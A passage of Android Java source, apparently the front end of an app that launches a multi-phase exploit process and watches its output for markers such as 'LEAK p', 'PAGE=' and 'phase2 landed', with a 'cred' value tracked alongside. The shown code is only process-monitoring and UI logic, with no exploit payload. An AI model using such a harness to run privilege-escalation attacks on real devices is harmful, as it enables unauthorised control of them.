            paint.setShader(null);
            paint.setColor(0xA8FFFFFF);
            canvas.drawCircle(Math.max(r, fill - r), r, Math.max(1, r * 0.24f), paint);
            if (Math.abs(target - shown) > 0.1f) postInvalidateOnAnimation();
        }
    }

    private static final class CredProcess {
        final Process process;
        final LineProcess lines;
        final long cred;
        CredProcess(Process p, LineProcess l, long c) { process=p; lines=l; cred=c; }
    }

    private final class LineProcess {
        private final Process p;
        private final List<String> lines = new ArrayList<>();
        private boolean finished;
        LineProcess(Process p, String label) {
            this(p, label, false);
        }
        LineProcess(Process p, String label, boolean importantOnly) {
            this.p = p;
            new Thread(() -> {
                try (var r = new java.io.BufferedReader(
                        new java.io.InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8))) {
                    String s; while ((s = r.readLine()) != null) {
                        if (!importantOnly || isImportantPhaseLine(s))
                            log("[" + label + "] " + s);
                        synchronized (lines) { lines.add(s); lines.notifyAll(); }
                    }
                } catch (Throwable ignored) {
                } finally {
                    synchronized (lines) {
                        finished = true;
                        lines.notifyAll();
                    }
                }
            }).start();
        }
        String waitForLine(String needle, long seconds) throws Exception {
            long end = System.currentTimeMillis() + seconds * 1000;
            int i = 0;
            while (System.currentTimeMillis() < end) {
                synchronized (lines) {
                    for (; i < lines.size(); i++)
                        if (lines.get(i).contains(needle)) return lines.get(i);
                    if (!p.isAlive()) return null;
                    lines.wait(200);
                }
            }
            return null;
        }
        String snapshot(long timeoutMs) throws Exception {
            long end = System.currentTimeMillis() + timeoutMs;
            synchronized (lines) {
                while (!finished && System.currentTimeMillis() < end)
                    lines.wait(100);
                return String.join("\n", lines);
            }
        }
    }

    private static boolean isImportantPhaseLine(String line) {
        return line.contains("== phase")
                || line.contains("LEAK p")
                || line.contains("PAGE=")
                || line.contains("phase2 landed")
                || line.contains("PHASE2_DONE")
                || line.contains("abort");
    }

    private void launchPackage(String pkg) {
        Intent i = getPackageManager().getLaunchIntentForPackage(pkg);
        if (i != null) startActivity(i);
        else Toast.makeText(this, "未安装：" + pkg, Toast.LENGTH_LONG).show();
    }
}
